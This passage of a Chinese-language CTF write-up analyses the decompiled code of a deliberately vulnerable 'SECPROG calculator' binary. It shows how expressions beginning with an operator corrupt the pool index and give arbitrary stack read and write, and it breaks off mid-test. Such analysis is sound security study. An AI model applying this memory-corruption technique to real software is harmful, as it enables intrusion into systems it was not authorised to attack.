class="built_in">puts</span>(<span class="string">&quot;=== Welcome to SECPROG calculator ===&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">calc</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Merry Christmas!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>輸出歡迎後呼叫 <code>cal()</code>。</p><h3 id="calc-1"><a href="#calc-1" class="headerlink" title="calc()"></a>calc()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">bzero</span>(input, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">get_expr</span>((<span class="type">int</span>)input, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">init_pool</span>(pool);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">      <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>用無限迴圈讀取使用者輸入，先用 <code>bzero()</code> 初始化即將要輸入的陣列，用 <code>get_expr()</code> 讀取，讀取成功後用 <code>init_pool()</code> 初始化結果陣列，並且呼叫 <code>parse_expr()</code> 計算結果，最後輸出答案： <code>pool[pool[0]]</code> ，接著細看 <code>get_expr()</code>。</p><h3 id="get-expr"><a href="#get-expr" class="headerlink" title="get_expr()"></a>get_expr()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">get_expr</span><span class="params">(<span class="type">int</span> user_input, <span class="type">int</span> max_input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> curr_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input_char; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; max_input &amp;&amp; <span class="built_in">read</span>(<span class="number">0</span>, &amp;input_char, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; input_char != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input_char == <span class="string">&#x27;+&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;*&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;/&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;%&#x27;</span></span><br><span class="line">      || input_char &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; input_char &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      curr_index = count++;</span><br><span class="line">      *(_BYTE *)(user_input + curr_index) = input_char;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(count + user_input) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>迴圈會判斷輸入是否：</p><ol><li>小於 1024 個 Bytes</li><li>成功讀取字元</li><li>字元非換行符號<br>皆符合就輸入到 <code>user_input</code> 的尾巴，最後會返回輸入的大小。</li></ol><h3 id="parse-expr"><a href="#parse-expr" class="headerlink" title="parse_expr()"></a>parse_expr()</h3><p>這部分有點長，我把它拆開來分析：</p><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="type">int</span> input, _DWORD *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> point_on_input; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> operators_array_index; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> part_size; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *part_input; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> part_input_int; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operators_array[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  point_on_input = input;</span><br><span class="line">  operators_array_index = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">bzero</span>(operators_array, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(i + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      part_size = i + input - point_on_input;</span><br><span class="line">      part_input = (<span class="type">char</span> *)<span class="built_in">malloc</span>(part_size + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(part_input, point_on_input, part_size);</span><br><span class="line">      part_input[part_size] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(part_input, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div><p>接下來一連串的判斷是要處理運算的先後順序，首先要是符號才能進入最外層，然後會把這個符號前未處理的數字切成 <code>part_input</code> 並且判斷是否為 0（這個程式拒絕任何的 0 單獨出現 XD，前面測試階段有發現）</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">part_input_int = <span class="built_in">atoi</span>((<span class="type">int</span>)part_input);</span><br><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  pool_index = (*pool)++;</span><br><span class="line">  pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(i + input) &amp;&amp; *(<span class="type">char</span> *)(i + <span class="number">1</span> + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>第一部分沒問題後就會把切塊的字串轉成整數，因為 <code>*pool = pool[0]</code>，所以 <code>pool_index</code> 會儲存 <code>pool[0]</code> 之後，執行<code>pool[0]+1</code> ，這邊可以理解成 <code>pool[0] = pool.size()</code>。把切塊的整數放到 <code>pool</code> 的最後面，接著判斷符號後面是否還有東西而且不是符號，否則輸出錯誤訊息。</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">      point_on_input = i + <span class="number">1</span> + input;</span><br><span class="line">      <span class="keyword">if</span> ( operators_array[operators_array_index] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + input) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operators_array[operators_array_index] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; operators_array[operators_array_index] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            operators_array[++operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">            operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + input) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( operators_array_index &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如果符號陣列不是空就照不同情況作運算，否則放入目前符號到符號陣列中，呼叫 <code>eval()</code> 計算。</p><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">eval</span><span class="params">(_DWORD *pool, <span class="type">char</span> operators)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( operators == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators &gt; <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( operators == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] /= (<span class="type">int</span>)pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  --*pool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以發現 <code>eval()</code> 都是用 <code>pool[0]</code> 當成相對位址的 <code>base</code> 來取其他位置的值</p><h2 id="0x3-Fuzzing-Analyze"><a href="#0x3-Fuzzing-Analyze" class="headerlink" title="0x3 Fuzzing &amp; Analyze"></a>0x3 Fuzzing &amp; Analyze</h2><p>在最一開始執行程式的時候有發現只要開頭是符號結果就怪怪的，我們來分析一下出了什麼問題，先拿 +12+34 當例子：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+12+34</span><br><span class="line">34</span><br></pre></td></tr></table></figure></div><ul><li>第一個加號</li></ul><ol><li>因為是符號會通過最外層的 <code>if</code>，且 <code>part_input = &#39;&#39;</code>，不等於 0 所以不會輸出錯誤訊息。</li><li>接著 <code>atoi</code> 會把空字串轉成 0，沒有大於 0 所以第一個判斷不會進，後面不是符號所以也不會進錯誤。</li><li><code>operators_array[operators_array_index]</code> 是空的所以會執行<code>operators_array[0] = &#39;+&#39;</code>，後面還有東西所以繼續執行。</li></ol><ul><li>第二個加號</li></ul><ol><li>一樣會通過最外層的 <code>if</code>，<code>part_input = 12</code>，非 0 所以不會進錯誤。</li><li>整數 56 大於 0，所以會執行以下的程式碼：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">pool[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">pool[<span class="number">1</span>] = part_input_int = <span class="number">12</span>;</span><br></pre></td></tr></table></figure></div>下個字元不是符號不會進錯誤。</li><li>符號陣列已經存了一個 <code>&#39;+&#39;</code> 所以會執行：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br></pre></td></tr></table></figure></div>也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(pool, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment">// 進入 eval()</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br><span class="line"><span class="comment">// 離開 eval()</span></span><br><span class="line">operators_array[<span class="number">0</span>] = <span class="string">&#x27;+&#x27;</span>;</span><br></pre></td></tr></table></figure></div>我們再細看一下 <code>pool[pool[0] - 1] += pool[pool[0]];</code>：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span><span class="number">-1</span>] = pool[<span class="number">0</span>]</span><br><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = <span class="number">12</span></span><br><span class="line">pool[<span class="number">0</span>] + <span class="number">1</span> - <span class="number">1</span> = <span class="number">12</span></span><br></pre></td></tr></table></figure></div>關鍵就在這裡，作為相對位址基值的第零格被我們篡改了！<br>接下就會再執行一次下面兩段程式碼：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = (*pool)++;</span><br><span class="line">pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div>也就是：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line">pool_index = pool[<span class="number">0</span>]++ = <span class="number">13</span>;</span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">14</span></span><br><span class="line">pool[<span class="number">13</span> + <span class="number">1</span>] = <span class="number">34</span></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">pool[<span class="number">14</span> - <span class="number">1</span>] += pool[<span class="number">14</span>] = <span class="number">34</span></span><br><span class="line">pool[<span class="number">13</span>] = pool[<span class="number">13</span>] + <span class="number">34</span></span><br><span class="line">pool[<span class="number">0</span>] - <span class="number">1</span> = <span class="number">13</span></span><br></pre></td></tr></table></figure></div>這代表我們可以做到任意寫和任意讀，確認一下輸出的位置是哪裡：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>所以會印出 <code>pool[pool[0]]</code>:<br>在這裡的情況就是<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] = <span class="number">13</span></span><br><span class="line">pool[pool[<span class="number">0</span>]] = pool[<span class="number">13</span>]</span><br></pre></td></tr></table></figure></div>所以會印出 pool[13] &#x3D; pool[13] + 34<br>我們來把結論代數化方便我們理解他們的關係：<br>假設 x, y 皆為正整數。</li></ol><h3 id="Case-1-x"><a href="#Case-1-x" class="headerlink" title="Case 1: +x"></a>Case 1: +x</h3><p>執行 1：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>結果 1：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">pool[<span class="number">1</span>] = x</span><br></pre></td></tr></table></figure></div><p>執行 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div><p>結果 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[<span class="number">0</span>] += pool[<span class="number">1</span>] = x </span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span> - <span class="number">1</span> = x</span><br></pre></td></tr></table></figure></div><p>印出：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x]</span><br></pre></td></tr></table></figure></div><h3 id="Case-2-x-y"><a href="#Case-2-x-y" class="headerlink" title="Case 2: +x+y"></a>Case 2: +x+y</h3><p>基於上面的結果我們再加 y：<br>目前：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = <span class="number">0</span></span><br><span class="line">pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">1</span>] = x </span><br></pre></td></tr></table></figure></div><p>執行 1：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    pool_index = (*pool)++;</span><br><span class="line">    pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>結果 1：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool_index = pool[<span class="number">0</span>] = x</span><br><span class="line">pool[<span class="number">0</span>] = x + <span class="number">1</span></span><br><span class="line">pool[x + <span class="number">1</span>] = y</span><br></pre></td></tr></table></figure></div><p>執行 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>] - <span class="number">1</span>] += pool[pool[<span class="number">0</span>]];</span><br><span class="line">--*pool;</span><br></pre></td></tr></table></figure></div><p>結果 2:</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pool[x + <span class="number">1</span> - <span class="number">1</span>] += pool[x + <span class="number">1</span>] = y</span><br><span class="line">pool[x] += y</span><br><span class="line">pool[x] = pool[x] + y</span><br><span class="line">pool[<span class="number">0</span>] = x</span><br></pre></td></tr></table></figure></div><p>印出：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[pool[<span class="number">0</span>]] = pool[x] = pool[x] + y</span><br></pre></td></tr></table></figure></div><h3 id="代數化結論"><a href="#代數化結論" class="headerlink" title="代數化結論"></a>代數化結論</h3><ul><li>+x<ul><li>印出 pool[x]</li></ul></li><li>+x+y<ul><li>pool[x] &#x3D; pool[x] + y</li><li>pool[x + 1] &#x3D; y</li><li>印出 pool[x] &#x3D; pool[x] + y</li></ul></li></ul><p>我們執行一個特殊的 case 確認一下我們的推論：<br>因為迴圈每次都會執行 <code>init_pool(pool);</code><br>所以 case 會挑 pool 外的地址</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+400      <span class="comment"># 